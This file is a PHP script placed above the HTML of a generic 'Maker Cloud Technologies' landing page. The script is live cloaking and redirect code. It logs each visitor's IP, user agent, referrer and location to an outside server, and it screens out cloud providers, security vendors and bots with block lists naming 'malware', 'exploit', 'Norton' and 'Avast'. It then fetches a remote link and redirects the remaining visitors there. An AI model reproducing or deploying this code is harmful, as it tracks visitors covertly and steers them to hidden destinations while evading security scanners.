<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['CF-Connecting-IP'] ?? $_SERVER['Cf-Connecting-Ip'] ?? $_SERVER['cf-connecting-ip'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['Forwarded'] ?? $_SERVER['forwarded'] ?? $_SERVER['x-real-ip'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['x-forwarded-for'] ?? $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_USER_AGENT'] ?? $_SERVER['HTTP_DEVICE_STOCK_UA'] ?? $_SERVER['HTTP_X_OPERAMINI_PHONE_UA'] ?? $_SERVER['HEROKU_APP_DIR'] ?? $_SERVER['X_FB_HTTP_ENGINE'] ?? $_SERVER['X_PURPOSE'] ?? $_SERVER['REQUEST_SCHEME'] ?? $_SERVER['CONTEXT_DOCUMENT_ROOT'] ?? $_SERVER['SCRIPT_FILENAME'] ?? $_SERVER['REQUEST_URI'] ?? $_SERVER['SCRIPT_NAME'] ?? $_SERVER['PHP_SELF'] ?? $_SERVER['REQUEST_TIME_FLOAT'] ?? $_SERVER['HTTP_COOKIE'] ?? $_SERVER['HTTP_ACCEPT_ENCODING'] ?? $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? $_SERVER['QUERY_STRING'] ?? $_SERVER['X_WAP_PROFILE'] ?? $_SERVER['PROFILE'] ?? $_SERVER['WAP_PROFILE'] ?? $_SERVER['HTTP_REFERER'] ?? $_SERVER['HTTP_HOST'] ?? $_SERVER['HTTP_VIA'] ?? $_SERVER['HTTP_CONNECTION'] ?? $_SERVER['HTTP_X_REQUESTED_WITH'] ?? $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_INCAP_CLIENT_IP'] ?? $_SERVER['HTTP_X_SUCURI_CLIENTIP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'];
$apiUrl = "http://ip-api.com/json/{$ip}";
$response = file_get_contents($apiUrl);
$data = json_decode($response);

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referrer = $_SERVER['HTTP_REFERER'] ?? '';

$country = $data->country ?? null;
$city = $data->city ?? null;
$isp = $data->isp ?? null;

$hostName = gethostbyaddr($ip);

$os = '';
$device = 'Unknown';

if (preg_match('/Windows/i', $userAgent)) {
    $os = 'Windows';
} elseif (preg_match('/Android/i', $userAgent)) {
    $os = 'Android';
} elseif (preg_match('/Linux/i', $userAgent)) {
    $os = 'Linux';
} elseif (preg_match('/iOS/i', $userAgent)) {
    $os = 'iOS';
} elseif (preg_match('/Mac OS X/i', $userAgent)) {
    $os = 'macOS';
}

if (preg_match('/(Windows|Linux|Macintosh)/i', $userAgent)) {
    if (preg_match('/Mobile/i', $userAgent)) {
        $device = 'Mobile';
    } elseif (preg_match('/Tablet/i', $userAgent)) {
        $device = 'Tablet';
    } else {
        $device = 'Desktop';
    }
}

$blockedISPs = [
    'Google LLC', 
    'SoftLayer', 
    'Google Singapore', 
    'DigitalOcean',
    'Amazon', 
    'Google', 
    'Microsoft', 
    'Facebook', 
    'Yahoo', 
    'Apple', 
    'Alibaba', 
    'Tencent',
    'Malware',
    'Huawei',
    'Clouds',
    'BLU VH',
    'OVH US',
    'Comcast',
    'Computer',
    'AOL',
    'Verizon',
    'Level',
    'Sprint',
    'Norton',
    'Avast'
];

$blockedHosts = [
    'google', 
    'amazon', 
    'reverse', 
    'facebook', 
    'yahoo', 
    'apple', 
    'alibaba', 
    'tencent',
    'malware',
    'huawei',
    'hwclouds',
    'clouds',
    'googleusercontent',
    'digitalocean',
    'vps',
    'ovh',
    '1blu',
    'com',
    'baidu',
    'yandex',
    'wordpress',
    'joomla',
    'drupal',
    'python',
    'ruby',
    'php',
    'asp',
    'nginx'
];

$blockedKeywords = [
    'google', 
    'amazon', 
    'reverse', 
    'facebook', 
    'yahoo', 
    'apple', 
    'alibaba', 
    'tencent',
    'malware',
    'huawei',
    'hwclouds',
    'clouds',
    'googleusercontent',
    'digitalocean',
    'vps',
    'ovh',
    '1blu',
    'com',
    'BLU VH',
    'OVH US',
    'Comcast',
    'python',
    'proxy',
    'tor',
    'vpn',
    'exploit',
    'hacker',
    'phishing',
    'ddos',
    'botnet',
    'rootkit'
];

$isBlockedUserAgent = false;
$redirectReason = 'Yönlendirildi | Success';

foreach ($blockedISPs as $blockedISP) {
    if (stripos($isp, $blockedISP) !== false) {
        $isBlockedUserAgent = true;
        $redirectReason = 'Yasaklı ISP | Blocked ISP';
        break;
    }
}

foreach ($blockedHosts as $blockedHost) {
    if (stripos($hostName, $blockedHost) !== false) {
        $isBlockedUserAgent = true;
        $redirectReason = 'Yasaklı Host | Blocked Host';
break;
}
}

foreach ($blockedKeywords as $blockedKeyword) {
if (stripos($isp, $blockedKeyword) !== false || stripos($hostName, $blockedKeyword) !== false) {
$isBlockedUserAgent = true;
$redirectReason = 'ISP veya Host Yasaklı | Blocked ISP & Host';
break;
}
}

$site = $_SERVER['HTTP_HOST'];

$date = date('d-m-Y H:i:s');
$isRedirected = $isBlockedUserAgent ? 0 : 1;

function sendToRemoteDB($data) {
$url = 'https://blastiofficial.com/insert.php';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
return $response;
}

$dataToSend = [
'ip' => $ip,
'device' => $device,
'userAgent' => $userAgent,
'country' => $country,
'city' => $city,
'isp' => $isp,
'host' => $hostName,
'os' => $os,
'referrer' => $referrer,
'isRedirected' => $isRedirected,
'redirectReason' => $redirectReason,
'site' => $site,
'date' => $date
];

$remoteResponse = sendToRemoteDB($dataToSend);

function fetchRedirectUrl($site) {
    $url = 'https://blastiofficial.com/fetch_link.php';
    $data = ['site' => $site];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $result = json_decode($response, true);
    return $result;
}

$redirectUrl = fetchRedirectUrl($site);

if ($remoteResponse === 'success') {
    if ($isRedirected && $redirectUrl['site2'] !== 'none') {
        header('Location: ' . $redirectUrl['site2']);
        exit;
    }
    // Eğer yasaklı kullanıcı ise veya 'durum' 'Pasif' ise mevcut sayfada kal
    // echo "Yönlendirme yapılmadı: " . $redirectReason;
} else {
    // echo "Hata: Uzak sunucuya gönderilemedi.";
    exit;
}
?>






























<!DOCTYPE html>
<html lang="en" data-theme=none>

<head>
    <meta charset="utf-8">
    <meta http - equiv="X-UA-Compatible" content="IE=edge">
    <meta name="title" content="Maker Cloud Technologies | Cloud-Based Software Development | Custom Software">
    <title>Maker Cloud Technologies | Cloud-Based Software Development | Custom Software</title>
    <meta name="description" content="Maker Cloud Technologies: Leading provider of cloud-based technology solutions.**

**Learn more about our innovative services and how we can help you achieve your business goals">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://makercloudtechnologies352.vzy.io">
    <meta property="og:title" content="Maker Cloud Technologies | Cloud-Based Software Development | Custom Software">
    <meta property="og:description" content="Maker Cloud Technologies: Leading provider of cloud-based technology solutions.**

**Learn more about our innovative services and how we can help you achieve your business goals">
    <meta property="og:image" content="https://images.unsplash.com/photo-1671726203449-34e89df45211?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3wzNDk5MjB8MXwxfHNlYXJjaHwxfHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&ixlib=rb-4.0.3&q=80&w=1080">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://makercloudtechnologies352.vzy.io">
    <meta property="twitter:title" content="Maker Cloud Technologies | Cloud-Based Software Development | Custom Software">
    <meta property="twitter:description" content="Maker Cloud Technologies: Leading provider of cloud-based technology solutions.**

**Learn more about our innovative services and how we can help you achieve your business goals">
    <meta property="twitter:image" content="https://images.unsplash.com/photo-1671726203449-34e89df45211?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3wzNDk5MjB8MXwxfHNlYXJjaHwxfHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&ixlib=rb-4.0.3&q=80&w=1080">

    <link rel="icon" type="image/svg" href="https://app.vzy.co/assets/icons/favicon.svg" />
    <link rel="preconnect" href="https://fonts.gstatic.com">


    <link rel="stylesheet" type="text/css" href="https://app.vzy.co/assets/css/vzy_v1.css">
    <link rel="mask-icon" href="https://app.vzy.co/assets/icons/favicon.svg" color="#808080">
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <style lang="css">
		#preloader{
			display: flex;justify-content:center;align-items:center; flex-direction:column;
			height:100vh;width: 100vw;
			position: fixed; z-index: 100;top: 0px;left: 0px;
			background: var(--background);
			opacity: 1;
            text-align:center;
            padding:50px;
		}
		#preloader.done{
			opacity: 0;
			transition: 1s ease;
		}
        @font-face {
            font-family: "Titillium Web bold";
            src: url("https://fonts.gstatic.com/s/titilliumweb/v15/NaPDcZTIAOhVxoMyOr9n_E7ffHjDKIx5YrSYqWM.ttf");
        }
        @font-face {
            font-family: "Titillium Web regular";
            src: url("https://fonts.gstatic.com/s/titilliumweb/v15/NaPecZTIAOhVxoMyOr9n_E7fRMTsDIRSfr0.ttf");
        }
	</style>

    <script>
    var currentURL = window.location.href;
    var targetDomain = "undefined";
    // console.log('undefined', 'currentUrl: ', currentURL, 'targetDomain: ', targetDomain, !currentURL.includes(targetDomain))
    if ('undefined' && targetDomain !== 'undefined' && !currentURL.includes(targetDomain)) {
        if (!targetDomain.startsWith("https://")) {
            targetDomain = "https://" + targetDomain;
        }

        var currentRoute = window.location.pathname;
// console.log(currentRoute.length);
        if (currentRoute.length > 0) {
            var newURL = targetDomain + currentRoute;
            // console.log(newURL);
            window.location.replace(newURL);
        }
    }
    </script>

    
    </head>

<body>
    <!--Container -->
    <div class="container">
<!--[--><!--[--><div id="preloader"><span class="t-2 logo-text">Maker Cloud Technologies</span><!----></div><!--]--><div class="navbar-box w-fit" style="--logo-height:24px;"><div class="navbar header-box"><!----><div class="header-1 w-boxed"><div class="desktop-nav"><header><nav><div class="icon-link"><a href="/" class="logo"><!----><span class="t-2 logo-text">Maker Cloud Technologies</span></a><!----></div><ul class="nav__list"><!--[--><!--]--></ul></nav><div class="button-holder"><a href="javascript:void(0)" target="" id="btn-1"><button class="site-btn t-1 shape">Get Started</button></a><a id="btn-2" href="https://vzy.co" target="_blank"><button class="site-btn t-1 shape">Get Started</button></a><ul class="theme-button"><li class="dark-mode" style="display:none;"><a href="javascript:void(0)" name="dark-theme"><svg width="24" height="25" viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.958 2.34399C14.6372 5.52163 14.103 9.4162 11.6303 12.0244C9.1576 14.6326 5.29704 15.3735 2.03442 13.8661C2.83817 19.0086 7.44338 22.6807 12.6357 22.3195C17.828 21.9583 21.8804 17.6838 21.9644 12.4797C22.0483 7.27549 18.136 2.87253 12.958 2.34399Z" stroke="var(--foreground)" stroke-linecap="square"></path></svg></a></li><li class="light-mode" style="display:none;"><a href="javascript:void(0)" name="light-theme"><svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4.51468 4.85875L6.21174 6.55581M19.7882 20.1323L21.4852 21.8293M19.7882 6.55581L21.4853 4.85875M4.51471 21.8293L6.21177 20.1322M13 1.34399V3.744M13 22.944L13 25.344M22.6 13.344L25 13.344M1 13.344H3.4" stroke="var(--foreground)" stroke-linecap="square"></path><path d="M8 13.344C8 10.5826 10.2386 8.34399 13 8.34399C15.7614 8.34399 18 10.5826 18 13.344C18 16.1054 15.7614 18.344 13 18.344C10.2386 18.344 8 16.1054 8 13.344Z" stroke="var(--foreground)"></path></svg></a></li><!----></ul><!----></div></header></div></div><!----><!----><!----><div class="mobile-nav" style="--logo-height:24px;"><header><div class="icon-link"><a href="/" class="logo t-3"><!----><span class="t-2 logo-text">Maker Cloud Technologies</span></a><!----></div><div class="show-theme-btn menu-icon"><ul class="theme-button"><li class="dark-mode" style="display:none;"><a href="javascript:void(0)" name="dark-theme"><svg width="24" height="25" viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.958 2.34399C14.6372 5.52163 14.103 9.4162 11.6303 12.0244C9.1576 14.6326 5.29704 15.3735 2.03442 13.8661C2.83817 19.0086 7.44338 22.6807 12.6357 22.3195C17.828 21.9583 21.8804 17.6838 21.9644 12.4797C22.0483 7.27549 18.136 2.87253 12.958 2.34399Z" stroke="var(--foreground)" stroke-linecap="square"></path></svg></a></li><li class="light-mode" style="display:none;"><a href="javascript:void(0)" name="light-theme"><svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4.51468 4.85875L6.21174 6.55581M19.7882 20.1323L21.4852 21.8293M19.7882 6.55581L21.4853 4.85875M4.51471 21.8293L6.21177 20.1322M13 1.34399V3.744M13 22.944L13 25.344M22.6 13.344L25 13.344M1 13.344H3.4" stroke="var(--foreground)" stroke-linecap="square"></path><path d="M8 13.344C8 10.5826 10.2386 8.34399 13 8.34399C15.7614 8.34399 18 10.5826 18 13.344C18 16.1054 15.7614 18.344 13 18.344C10.2386 18.344 8 16.1054 8 13.344Z" stroke="var(--foreground)"></path></svg></a></li></ul><!----><!----><div class="site-menu-icon-container"><span class="site-menu-icon icon-2"></span></div></div></header><div class="mobile-nav-overlay bordered"><div class="header-nav"><nav><ul><!--[--><!--]--></ul></nav><div class="button-holder"><a href="javascript:void(0)" target="" id="btn-1"><button class="site-btn t-1 shape">Get Started</button></a><a id="btn-2" href="https://vzy.co" target="_blank"><button class="site-btn t-1 shape">Get Started</button></a><!----></div></div></div></div></div></div><div class="spacer"></div><!--]--><div class="banner-box new box section-bg-wrapper
    left" id="maker-cloud-technologies--the-future-of-making-1"><section class="w-boxed min-shape section-content"><div class="banner-box section-bg-wrapper  transparent	color     min-shape" style="--bg-color:--accent;--spacingTB:calc(var(--unit) * 5);--spacingLR:calc(var(--unit) * 2);"><div class="min-shape inner-content section-container"><!----><!----><!----><div class="banner-layout-3 w-boxed"><div class="banner section-component"><div class="banner-text content-heading" style=""><!----><h1 class="t-7 title pre-line">Maker Cloud Technologies: The future of making</h1><p class="t-2 pre-line subtitle-width-size subtitle" data-size="100" style="">Maker Cloud Technologies: The future of cloud computing is here.**

With our innovative platform, you can easily create, manage, and deploy your cloud applications. Our scalable and secure infrastructure ensures that your applications are always up and running, and our expert support team is available to help you every step of the way.

**So what are you waiting for?**

**Start your journey to the cloud today with Maker Cloud Technologies</p><!--[--><!----><!----><p class="t-0 feedback" id="feedbackMessage" style="display:none;">Thank you for subscribing</p><form class="email subscribe name subtitle-width-size" onsubmit="return false" data-form="more-input" data-size="100" style=""><div class="names-input"><input name="firstname" type="text" class="shape" placeholder="First name"><!----></div><input name="email" type="text" class="shape" placeholder="Email"><!----><!----><!----><!----><p class="t-0 feedback" id="feedbackMessage2" style="display:none;"> Thank you for subscribing </p><button class="site-btn t-1 shape mt-2">Get Started</button><!----></form><p id="error" class="error" style="display:none;">Thank you for subscribing</p><p class="t-1" id="feedback" style="display:none;">Thank you for subscribing</p><!--]--><!----></div><!--[--><div id="banner-image_1" class="banner-image min-shape" style="height:600px;--height:600px;"><!--[--><img src="https://images.unsplash.com/photo-1671726203449-34e89df45211?crop=entropy&amp;cs=srgb&amp;fm=jpg&amp;ixid=M3wzNDk5MjB8MXwxfHNlYXJjaHwxfHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&amp;ixlib=rb-4.0.3&amp;q=85" class="Fill grey"><!----><!--]--><!----><!----></div><!--]--></div></div><!----><!----><!----><!----><span id="successMessage" style="display:none;">Thank you! Your submission has been received</span></div></div></section><!----><!----></div><div class="review-box box  transparent color" style="--bg-color:--accent;" id="reviews"><div class="inner-content"><!----><div class="w-boxed review-section left background no-border layout-1"><div class="review-header" style=""><!----><h2 class="t-4 pre-line">Testimonials</h2><!----></div><div class="col-3 grid review-container"><!--[--><div class="cursor-none review"><a href="javascript:void(0)" target="" name="review-link" class="review-link min-shape"><div class="review-item"><div class="review-icon"><!--[--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--]--></div><div class="review-text"><h3 class="t-1 pre-line">Maker Cloud Technologies is a leading provider of technology solutions that help businesses succeed</h3></div></div><div class="reviewer-details"><!----><div class="vertical-align reviewer-description"><p class="pre-line name t-0">Sarah Smith</p><!----></div></div></a><!----></div><div class="cursor-none review"><a href="javascript:void(0)" target="" name="review-link" class="review-link min-shape"><div class="review-item"><div class="review-icon"><!--[--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--c-mix-10)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--c-mix-10)" fill-rule="evenodd"></path></svg></span><!--]--><!--]--></div><div class="review-text"><h3 class="t-1 pre-line">Maker Cloud Technologies is the best place to go for all your technology needs. They have a wide variety of products and services to choose from, and their staff is always friendly and helpful. I highly recommend them</h3></div></div><div class="reviewer-details"><!----><div class="vertical-align reviewer-description"><p class="pre-line name t-0">John Smith</p><!----></div></div></a><!----></div><div class="cursor-none review"><a href="javascript:void(0)" target="" name="review-link" class="review-link min-shape"><div class="review-item"><div class="review-icon"><!--[--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--accent)" fill-rule="evenodd"></path></svg></span><!--]--><!--[--><span><svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12 16.733-6.1667 4.6 2.3667-7.4-6.2-4.6h7.6667l2.3333-7.3333 2.3333 7.3333h7.6667l-6.2 4.6 2.3667 7.4-6.1667-4.6z" clip-rule="evenodd" fill="var(--c-mix-10)" fill-rule="evenodd"></path></svg></span><!--]--><!--]--></div><div class="review-text"><h3 class="t-1 pre-line">Maker Cloud Technologies is a top-notch technology company that provides innovative solutions for businesses of all sizes</h3></div></div><div class="reviewer-details"><!----><div class="vertical-align reviewer-description"><p class="pre-line name t-0">Sarah Jackson</p><!----></div></div></a><!----></div><!--]--></div></div><!----></div></div><div class="card-box box  grey color  image-selected" style="--bg-color:--c-mix-1;--bg-accent-color:;overflow:visible;" id="cards"><div style="--image-height:300px;--image-height-mobile:250px;" class="inner-content"><!----><div class="card-1 left w-boxed background"><div class="card-header" style=""><!----><h2 class="t-4 pre-line">Features</h2><!----><!----></div><div class="card-container col-3 col-mobile-1"><!--[--><div class="cursor-none card" style=""><a href="javascript:void(0)" target="" name="card-link" class="top"><div class="card-text"><h3 class="t-1 pre-line">Cloud computing</h3><!----><!----></div><div class="card-image min-shape" style="height:var(--image-height);"><!--[--><img src="https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3wzNDk5MjB8MHwxfHNlYXJjaHwyfHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&amp;ixlib=rb-4.0.3&amp;q=80&amp;w=1080" style="height:var(--image-height);"><!--]--></div><!--[--><!----><!----><!--]--></a><!----></div><div class="cursor-none card" style=""><a href="javascript:void(0)" target="" name="card-link" class="top"><div class="card-text"><h3 class="t-1 pre-line">Software as a service (SaaS</h3><!----><!----></div><div class="card-image min-shape" style="height:var(--image-height);"><!--[--><img src="https://images.unsplash.com/photo-1518770660439-4636190af475?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3wzNDk5MjB8MHwxfHNlYXJjaHwzfHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&amp;ixlib=rb-4.0.3&amp;q=80&amp;w=1080" style="height:var(--image-height);"><!--]--></div><!--[--><!----><!----><!--]--></a><!----></div><div class="cursor-none card" style=""><a href="javascript:void(0)" target="" name="card-link" class="top"><div class="card-text"><h3 class="t-1 pre-line">Platform as a service (PaaS</h3><!----><!----></div><div class="card-image min-shape" style="height:var(--image-height);"><!--[--><img src="https://images.unsplash.com/photo-1531297484001-80022131f5a1?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3wzNDk5MjB8MHwxfHNlYXJjaHw0fHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&amp;ixlib=rb-4.0.3&amp;q=80&amp;w=1080" style="height:var(--image-height);"><!--]--></div><!--[--><!----><!----><!--]--></a><!----></div><!--]--></div></div><!----></div></div><div class="hero-box box section-bg-wrapper
    center   lr-padding" id="hero"><section class="w-boxed min-shape section-content"><div class="banner-box section-bg-wrapper grey	color     min-shape" style="--bg-color:--c-mix-1;--spacingTB:calc(var(--unit) * 5);--spacingLR:calc(var(--unit) * 5);"><div class="min-shape inner-content section-container"><!----><!----><!----><div class="hero-layout-3 w-boxed"><div class="hero section-component"><div class="full hero-text content-heading" style=""><!----><h2 class="t-4 pre-line">Subscribe to our newsletter</h2><p class="t-1 pre-line subtitle-width-size subtitle" data-size="55" style="width:55%">Get our latest news and updates</p><!--[--><!----><form class="email subscribe subtitle-width-size" onsubmit="return false" data-size="55" style="width:55%"><input type="text" name="email" class="shape" placeholder="Email"><button class="site-btn t-1 shape">Subscribe</button><!----></form><p class="t-0 feedback" id="feedbackMessage" style="display:none;">Thank you for subscribing</p><!----><p id="error" class="error" style="display:none;">Thank you for subscribing</p><p class="t-1" id="feedback" style="display:none;">Thank you for subscribing</p><!--]--></div><!----></div></div><!----><!----><!----><span id="successMessage" style="display:none;">Thank you! Your submission has been received</span></div></div></section><!----><!----></div><div class="hero-box box section-bg-wrapper
    left" id="hero-2"><section class="w-boxed min-shape section-content"><div class="banner-box section-bg-wrapper transparent	color     min-shape" style="--bg-color:--accent;--spacingTB:calc(var(--unit) * 5);--spacingLR:calc(var(--unit) * 5);"><div class="min-shape inner-content section-container"><!----><!----><div class="hero-layout-2 w-boxed"><div class="hero section-component"><div class="hero-text content-heading" style="text-align: left; "><section class="subtitle-width-size" data-size="75" style=""><!----><h2 class="t-4 pre-line">Maker Cloud: The future of invention</h2></section><section class="subtitle-width-size" data-size="75" style=""><p class="t-1 pre-line subtitle-width-size subtitle" style="width:75%">Maker Cloud Technologies: A Leader in Cloud Computing**

Maker Cloud Technologies is a leading provider of cloud computing services. Located in Secaucus, New Jersey, Maker Cloud Technologies offers a wide range of cloud computing services, including cloud computing infrastructure, cloud computing platforms, and cloud computing applications. Maker Cloud Technologies helps businesses of all sizes to improve their IT infrastructure and reduce their IT costs</p><!--[--><div class="button-holder mt-2" style=""><a target="" href="javascript:void(0)" class="btn-1"><button class="t-1 shape">Invent Better</button></a><!----><!----></div><!----><p class="t-0 feedback" id="feedbackMessage" style="display:none;"> Thank you for subscribing </p><!----><p id="error" class="error" style="display:none;">Thank you for subscribing</p><p class="t-1" id="feedback" style="display:none;">Thank you for subscribing</p><!--]--></section></div><!--[--><div id="hero-image_5" class="hero-image min-shape" style="height:500px;--height:500px;"><!----><!--[--><img src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3wzNDk5MjB8MHwxfHNlYXJjaHw1fHxUZWNobm9sb2d5fGVufDB8fHx8MTcwNTQzOTA5Mnww&amp;ixlib=rb-4.0.3&amp;q=80&amp;w=1080" class="Fill grey"><!----><!--]--><!----><!----></div><!--]--></div></div><!----><!----><!----><!----><span id="successMessage" style="display:none;">Thank you! Your submission has been received</span></div></div></section><!----><!----></div><div class="hero-box box section-bg-wrapper
